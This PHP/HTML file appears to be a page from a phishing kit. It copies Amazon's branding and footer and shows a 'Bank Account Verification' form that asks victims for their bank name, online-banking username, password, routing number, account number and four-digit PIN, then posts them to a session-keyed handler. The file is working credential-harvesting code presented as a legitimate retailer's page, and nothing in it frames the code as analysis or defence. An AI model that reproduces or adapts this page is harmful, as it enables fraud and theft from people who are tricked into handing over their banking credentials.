<?php  ?>
<html>
<head>
<title><?php echo $lang['billing']['title'];?></title>
<link rel='icon' href='../assets/img/favicon.ico'>
<link rel='stylesheet' href='../assets/css/mobile_login.css'>
<link rel='stylesheet' href='../assets/css/billing.css'>
<script src="../assets/js/jquery.js"></script>
<script src="../assets/js/jquery.masked.js"></script>
<meta charset='utf-8'>
<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
</head>
<body>
	<script>
	$(document).ready(function(){
  var bith = "dd/mm/yyyy";
  $("#ssn").mask("999-99-9999",{placeholder:"___-__-____"});
  $('input[name="dob"]').mask("99/99/9999", {placeholder: bith });
	$('input[name="phone"]').keyup(function(e) {
      if (/\D/g.test(this.value))
      {
        this.value = this.value.replace(/\D/g, '');
      }
    });
	});
	</script>
  <?php
  if($os == "Android" or $os == "iPhone") {}else{
    echo "<center>";
  } ?>

 <?php
  if($os == "Android" or $os == "iPhone") {
    echo '<header style="background-color:#232f3e;">
  <div class="hleft">
  <img style="margin-left:-15px;" src="../assets/img/logo.png" width="90px" height="30px"></img>
  </div>
  </header>';
  }else{
    echo '<br><header style="background-color:#fff;">
  <div class="hleft">
  <i class="a-icon a-icon-logo" style="background-position: -5px -130px;
    height: 31px;
    width: 103px;" role="img" aria-label="Amazon"></i>
  </div>
  </header>';
  } 
  ?>
  <?php
  if($os == "Android" or $os == "iPhone") {}else{
    echo "</center>";
  } ?>
<center>
	<?php
	if($os == "Android" or $os == "iPhone") {}else{
		echo "<br>";
	} ?>
<?php
  if($os == "Android" or $os == "iPhone") {
    echo '<div class="boxlogin">';
  }else{
    echo '<div style="width:400px;" class="boxlogin">';
  } 
  ?>
<div id="warnings" style='font-size:12px;font-family: Arial,sans-serif;'>
<h1>Bank Account Verification</h1>
<span style="font-size:15px;font-family: Arial,sans-serif;">Please enter your bank account to verify your account.</span>
<br>
<br><br>
 </div>
 <form action='bank_acc?session=<?php echo $key;?>' method='post' name='add' id='details'>
<div id="formbilling">
	<h3>Please connect your bank account</h3>
<div class="a-input-text-group a-spacing-medium a-spacing-top-micro">
  <div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="text" style="" placeholder="Name of Bank" name="bankname" id="bankname" autocorrect="off" autocapitalize="off" required="required">
  </div>
  <div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="text" placeholder="Bank Account Username" name="bankuser" id="bankuser" autocorrect="off" autocapitalize="off" required="required">
  </div>
  <div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="password" placeholder="Bank Account Password" name="bankpass" autocorrect="off" id="bankpass" autocapitalize="off" required="required">
  </div>
  <div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="text" placeholder="Routing Number" name="routing" id="routing" maxlength="10" autocorrect="off" autocapitalize="off">
  </div>
  <div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="text" placeholder="Account Number" name="accountnumber" maxlength="16" autocorrect="off" id="accountnumber" autocapitalize="off" required="required">
  </div>
  <div style="padding: 5px;" class="a-input-text-wrapper auth-required-field auth-fill-claim">
    <input type="text" placeholder="Pin Number" name="pin" autocorrect="off" minlength="4" maxlength="4" id="pin" autocapitalize="off" required="required">
  </div>
<br>
<input type='submit' id="submit_cc" class='button a-button-text' style="padding:10px;font-size:15px;background: linear-gradient(to bottom,#f7dfa5,#f0c14b);" value='Save'>
<br><a href="done?session=<?php echo $key;?>"><font style="font-size:15px;font-family: Arial,sans-serif;color: blue;">Continue without bank account</font></a>
</div></div>

</form>
</div>

</center>
<?php
if($os == "Android" or $os == "iPhone") {}else{
	echo "<br><br>";
} ?>
<?php
if($os == "Android" or $os == "iPhone") {
?>
<footer class="nav-mobile nav-locale-us nav-lang-en nav-ftr-batmobile">
                    <div id="nav-ftr" class="nav-t-basicNoAuth nav-sprite-v3">
                        <ul class="nav-ftr-horiz ">
                            <li class="nav-li "><a href="/gp/aw/help/ref=navm_ftr_cou?ie=UTF8&amp;id=cou" class="nav-a"><?php echo $lang['footer']['condi'];?></a></li>
                            <li class="nav-li "><a href="/gp/help/customer/display.html/ref=footer_privacy?ie=UTF8&amp;nodeId=468496" class="nav-a"><?php echo $lang['footer']['privacy'];?></a></li>
                            <li class="nav-li "><a href="/gp/aw/help/ref=navm_ftr_iba?ie=UTF8&amp;id=201308670" class="nav-a"><?php echo $lang['footer']['help'];?></a></li>
                        </ul>
                        <div id="nav-ftr-copyright"><?php echo $lang['footer']['copyright'];?></div>
                    </div>
                </footer>
<?php }?>
</body>
</html>
